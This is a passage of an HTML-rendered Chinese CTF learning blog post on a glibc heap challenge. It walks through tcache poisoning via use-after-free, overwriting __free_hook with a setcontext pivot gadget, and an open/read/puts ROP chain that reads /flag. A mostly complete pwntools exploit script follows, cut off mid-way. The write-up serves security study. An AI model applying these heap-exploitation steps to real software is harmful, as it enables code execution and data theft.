class=\"number\">0x20</span>]</span><br></pre></td></tr></table></figure>\n\n<p>​\t所以就是把chunk+8处的值传给rdx，也就是heap_addr+0x3a8-0x18，然后把heap_addr+0x3a8-0x18+0x20处的值，当作函数的地址进行调用, 在知道chunk地址的前提下,rdi+8可控的话,rdx+0x20的值也是可控的,</p>\n<p>​\t所以最终会布置成这个样子, rdi+8存放的是b3a0,然后b3a0+0x20就是b3c0,存放的是setcontext</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240127194412645.png\" alt=\"image-20240127194412645\"></p>\n<h3 id=\"实现步骤\"><a href=\"#实现步骤\" class=\"headerlink\" title=\"实现步骤\"></a>实现步骤</h3><p>​\t这里的目标是修改一个堆块的gender(chunk+8),虽然有666那个地方可以修改,但还是先用复杂一点的方法来. 如果要修改的话,就需要进行一个任意地址写,所以可以通过tcache poison (类似于double free) 申请到一个堆头前面的地址,然后来实现修改gender的效果</p>\n<p>​\t这里的目标就是修改fd，把fd修改为要修改gender堆块的上面的地址</p>\n<p>​\tfree(3)  上面的一个堆块，不知道为啥要选定这个（大概可以随便选一个，和0x380对应就行）</p>\n<p>​\tfree(1)  1指向的堆块其实是bb20，也就是前面一直利用的覆盖的那半个220的堆块 ，这里用到了uaf，0的位置也是bb20，这时候编辑它，修改了fd （<font color=\"red\">这里可见，chunk_list的0和1都是这个块，造成uaf</font>）</p>\n<p>​\t然后两次add，就让9获得了要伪造堆块的地址（ 为什么不直接在这里获取free_hook呢？ 为什么要在这里伪造堆块呢？）（<font color=\"red\">因为要修改bk，也就是rdi+8这个位置，作者这样弄其实是复杂了，虽然很通用，其实题目给出了一次修改性别的机会，估计就是用来干这个的</font>)</p>\n<p>​\t然后布置好chunk+8以及chunk+8所指向的地址的内容( 那个特殊的gadget\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ----- <span class=\"number\">2</span> 构造堆块重叠，使得可以向chunk+<span class=\"number\">8</span>位置写入数据；令在堆块上布置 跳往 setcontext链 的gadget</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">add</span><span class=\"params\">(<span class=\"number\">9</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span>   # 获取下面那一块usbin，这样的话 0 1 9 都是bb20了</span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">3</span>)</span>       </span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"title function_\">name_edit</span><span class=\"params\">(<span class=\"number\">0</span>,p64(heap_addr+<span class=\"number\">0x380</span>)[:<span class=\"number\">-1</span>])</span> # 要伪造的堆块的地址，为啥要在这里嘞，在下面不行嘛？？？</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"title function_\">add</span><span class=\"params\">(<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"title function_\">add</span><span class=\"params\">(<span class=\"number\">9</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span></span><br><span class=\"line\">    </span><br><span class=\"line\">pl = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x111</span>)</span><br><span class=\"line\">pl+= p64(<span class=\"number\">0</span>) + p64(heap_addr+<span class=\"number\">0x3a8</span><span class=\"number\">-0x18</span>) # 在chunk2的gender字段放置地址addr，令addr+<span class=\"number\">0x28</span>指向chunk2的des字段</span><br><span class=\"line\">pl+= p64(setcontext)</span><br><span class=\"line\">pl+= (<span class=\"number\">0xa0</span>-len(pl))*<span class=\"string\">&#x27;\\x00&#x27;</span> + p64(heap_addr+<span class=\"number\">0x5d0</span>) + p64(p_rdi_r)</span><br><span class=\"line\">    </span><br><span class=\"line\">content_edit(<span class=\"number\">9</span>,pl)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>content_edit(9,pl) 这里就覆盖了之前的堆块了，至于为啥要写入390位置，因为要把这里当作头，然后3a0作为内容地址，这样就可以edit写入了，edit写入的其实是伪造了一个完整的堆块</p>\n<p>free(7)</p>\n<p>free(8)</p>\n<p>name_edit(0,p64(free_hook)[:-1]) (再次UAF修改fd)</p>\n<p>0x00000000001547a1 : mov edx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</p>\n<p>1547a0是可以的！！！！</p>\n<p>│04:0020│  0x7ffff7f297a0 (getkeyserv_handle+576) ◂— mov rdx, qword ptr [rdi + 8]<br>    b’&gt;&gt; ‘                                                                                                │05:0028│  0x7ffff7f297a8 (getkeyserv_handle+584) ◂— call qword ptr [rdx + 0x20]</p>\n<h2 id=\"下一步\"><a href=\"#下一步\" class=\"headerlink\" title=\"下一步\"></a>下一步</h2><p>​\t\t为什么要free7呢？ free8可以理解，free 堆叠的chunk，然后修改fd，然后把freehook改为gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ----------------------------------------------- <span class=\"number\">3</span> <span class=\"built_in\">set</span> gadget into free_hook</span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">7</span>)</span></span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">8</span>)</span></span><br><span class=\"line\"><span class=\"title function_\">pause</span><span class=\"params\">()</span></span><br><span class=\"line\"><span class=\"title function_\">name_edit</span><span class=\"params\">(<span class=\"number\">0</span>,p64(free_hook)[:<span class=\"number\">-1</span>])</span></span><br><span class=\"line\"><span class=\"title function_\">add</span><span class=\"params\">(<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;8888&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"title function_\">add</span><span class=\"params\">(<span class=\"number\">7</span>,<span class=\"number\">1</span>,p64(gadget)[:<span class=\"number\">-1</span>])</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t前面你搞不懂的那串逻辑估计就和这个gadget有关！</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rdx, qword ptr [rdi + <span class=\"number\">8</span>]</span><br><span class=\"line\">call qword ptr [rdx + <span class=\"number\">0x20</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"rop链子\"><a href=\"#rop链子\" class=\"headerlink\" title=\"rop链子\"></a>rop链子</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ---------------------------------------------- <span class=\"number\">4</span> 在堆块中布置rop链</span><br><span class=\"line\">pl = p64(heap_addr+<span class=\"number\">0xb10</span>) + p64(p_rsi_r) + p64(<span class=\"number\">0</span>) + p64(open_addr)</span><br><span class=\"line\"># 这里要注意选择open返回的fd指针</span><br><span class=\"line\">pl+= p64(p_rdi_r) + p64(<span class=\"number\">4</span>) + p64(p_rsi_r) + p64(heap_addr+<span class=\"number\">0x500</span>) + p64(p_rdx_r12_r) + p64(<span class=\"number\">0x30</span>)*<span class=\"number\">2</span> + p64(read_addr)</span><br><span class=\"line\">pl+= p64(p_rdi_r) + p64(heap_addr+<span class=\"number\">0x500</span>) + p64(<span class=\"built_in\">puts</span>)</span><br><span class=\"line\">content_edit(<span class=\"number\">4</span>,pl)</span><br><span class=\"line\">name_edit(<span class=\"number\">0</span>,<span class=\"string\">&#x27;/flag\\x00\\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong><img src=\"/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123164245700.png\" alt=\"image-20240123164245700\"></strong></p>\n<h2 id=\"free触发\"><a href=\"#free触发\" class=\"headerlink\" title=\"free触发\"></a>free触发</h2><p>在free触发的时候，传入的第一个参数rdi是 要free的chunk的地址 free(2)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rdx, qword ptr [rdi + <span class=\"number\">8</span>]</span><br><span class=\"line\">call qword ptr [rdx + <span class=\"number\">0x20</span>]</span><br></pre></td></tr></table></figure>\n\n<p>所以就是把b3b0+8处的值传给rdx，也就是b3a0，然后把b3a0+0x20处的值，当作函数的地址，也就是b3c0，也就是setcontext</p>\n<p>setcontext &#x3D; base + sym(‘setcontext’) + 61</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123165326724.png\" alt=\"image-20240123165326724\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123165757086.png\" alt=\"image-20240123165757086\"></p>\n<p>通过这个来设置寄存器的值</p>\n<p>rdx是b3a0</p>\n<p>a0 设置了rsp</p>\n<p>主要就是来设置rsp，然后跳到后面rop那里，开始rop就可以了</p>\n<p>这里其实设置哪个chunk都可以，只要找好对应关系就可以了</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\">#coding=utf-8</span></span><br><span class=\"line\"><span class=\"comment\">#__author__:N1K0_</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> inspect</span><br><span class=\"line\"><span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> argv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak</span>(<span class=\"params\">var</span>):</span><br><span class=\"line\">    callers_local_vars = inspect.currentframe().f_back.f_locals.items()</span><br><span class=\"line\">    temp =  [var_name <span class=\"keyword\">for</span> var_name, var_val <span class=\"keyword\">in</span> callers_local_vars <span class=\"keyword\">if</span> var_val <span class=\"keyword\">is</span> var][<span class=\"number\">0</span>]</span><br><span class=\"line\">    p.info(temp + <span class=\"string\">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(var))</span><br><span class=\"line\"></span><br><span class=\"line\">s      = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class=\"line\">r      = <span class=\"keyword\">lambda</span> numb=<span class=\"number\">4096</span>          :p.recv(numb)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>, <span class=\"string\">b&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">plt     = <span class=\"keyword\">lambda</span> data               :elf.plt[data]</span><br><span class=\"line\">got     = <span class=\"keyword\">lambda</span> data               :elf.got[data]</span><br><span class=\"line\">sym     = <span class=\"keyword\">lambda</span> data               :libc.sym[data]</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">local_libc  = <span class=\"string\">&#x27;./libc.so.6&#x27;</span></span><br><span class=\"line\">remote_libc = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">binary = <span class=\"string\">&#x27;./pwn&#x27;</span></span><br><span class=\"line\">context.binary = binary</span><br><span class=\"line\">elf = ELF(binary,checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(binary)</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(argv) &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> argv[<span class=\"number\">1</span>]==<span class=\"string\">&#x27;r&#x27;</span>:</span><br><span class=\"line\">        p = remote(<span class=\"string\">&#x27;1&#x27;</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">libc = elf.libc</span><br><span class=\"line\"><span class=\"comment\"># libc = ELF(remote_libc)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;&#x27;</span></span>):</span><br><span class=\"line\">    <span class=\"comment\">#os.system(&#x27;tmux set mouse on&#x27;)</span></span><br><span class=\"line\">    context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">    gdb.attach(p,cmd)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">chunk_list = 0x40A0</span></span><br><span class=\"line\"><span class=\"string\">chunk_list_flag = 0x04060</span></span><br><span class=\"line\"><span class=\"string\">gender_chance = 0x4010</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># start</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;DEBUG&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,sex,name</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;index?\\n&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;2.Girl:\\n&#x27;</span>,<span class=\"built_in\">str</span>(sex))</span><br><span class=\"line\">    sa(<span class=\"string\">&quot;Please input your child&#x27;s name:\\n&quot;</span>,name)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">name_edit</span>(<span class=\"params\">idx,name</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;index&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sa(<span class=\"string\">&#x27;name:&#x27;</span>,name)</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Done!\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;index?&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>,<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;index?&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">change_sex</span>(<span class=\"params\">idx,sex</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>,<span class=\"string\">&#x27;666&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;index?&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Current gender:&#x27;</span>)</span><br><span class=\"line\">    temp = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;2.Girl:&#x27;</span>,<span class=\"built_in\">str</span>(sex))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> temp</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">content_edit</span>(<span class=\"params\">idx,data</span>):</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>,<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;index?&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    sa(<span class=\"string\">&#x27;description:&#x27;</span>,data)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">quit</span>():</span><br><span class=\"line\">    sla(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>,<span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ----------------------------- 1 利用double free构造堆块重叠， 泄露heap和libc地址</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    add(i,<span class=\"number\">1</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    free(<span class=\"number\">6</span>-i)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\">free(<span class=\"number\">7</span>)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\"><span class=\"comment\"># 从tcache中取出第一块分配</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\"><span class=\"comment\"># 将合并状态下的一部分chunk放入tcache，造成堆块重叠</span></span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\"># 再次申请，使放入tcache中的usbin chunk被分配，泄露堆地址</span></span><br><span class=\"line\">add(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\">free(<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;nder: &#x27;</span>)</span><br><span class=\"line\">heap_addr = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">leak(heap_addr)</span><br><span class=\"line\"><span class=\"comment\"># 合并进入usbin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">9</span>):</span><br><span class=\"line\">    add(i,<span class=\"number\">1</span>,<span class=\"built_in\">str</span>(i)+<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;nder: &#x27;</span>)</span><br><span class=\"line\">base = uu64(r(<span class=\"number\">6</span>))-<span class=\"number\">0x1ebbe0</span></span><br><span class=\"line\">leak(base)</span><br><span class=\"line\"><span class=\"comment\"># --------------------------- 2 构造堆块重叠，使得可以向chunk+8位置写入数据；令在堆块上布置setcontext链</span></span><br><span class=\"line\">open_addr  = base + sym(<span class=\"string\">&#x27;open&#x27;</span>)</span><br><span class=\"line\">read_addr = base + sym(<span class=\"string\">&#x27;read&#x27;</span>)</span><br><span class=\"line\">puts = base + sym(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">gadget = base + <span class=\"number\">0x1547a0</span></span><br><span class=\"line\">free_hook = base + sym(<span class=\"string\">&#x27;__free_hook&#x27;</span>)</span><br><span class=\"line\">setcontext = base + sym(<span class=\"string\">&#x27;setcontext&#x27;</span>) + <span class=\"number\">61</span></span><br><span class=\"line\">p_rdi_r = base + <span class=\"number\">0x26b72</span></span><br><span class=\"line\">p_rdx_r12_r = base + <span class=\"number\">0x11c1e1</span></span><br><span class=\"line\">p_rsi_r = base + <span class=\"number\">0x27529</span></span><br><span class=\"line\">leak(free_hook)</span><br><span class=\"line\">leak(gadget)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;99&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">name_edit(<span class=\"number\">0</span>,p64(heap_addr+<span class=\"number\">0x380</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr+<span class=\"number\">0x380</span>))</span><br><span class=\"line\">add(<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;888&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;999&#x27;</span>)</span><br><span class=\"line\">pl = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x111</span>)</span><br><span class=\"line\">pl+= p64(<span class=\"number\">0</span>) + p64(heap_addr+<span class=\"number\">0x3a8</span>-<span class=\"number\">0x18</span>) <span class=\"comment\"># 在chunk2的gender字段放置地址addr，令addr+0x28指向chunk2的des字段</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># setcontext</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">gadget 0x154930</span></span><br><span class=\"line\"><span class=\"string\">    mov     rdx, [rdi+8]</span></span><br><span class=\"line\"><span class=\"string\">    mov     [rsp+0C8h+var_C8], rax</span></span><br><span class=\"line\"><span class=\"string\">    call    qword ptr [rdx+20h]</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">pl+= p64(setcontext)</span><br><span class=\"line\">pl+= (<span class=\"number\">0xa0</span>-<span class=\"built_in\">len</span>(pl))*<span class=\"string\">b&#x27;\\x00&#x27;</span> + p64(heap_addr+<span class=\"number\">0x5d0</span>) + p64(p_rdi_r)</span><br><span class=\"line\">content_edit(<span class=\"number\">9</span>,pl)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 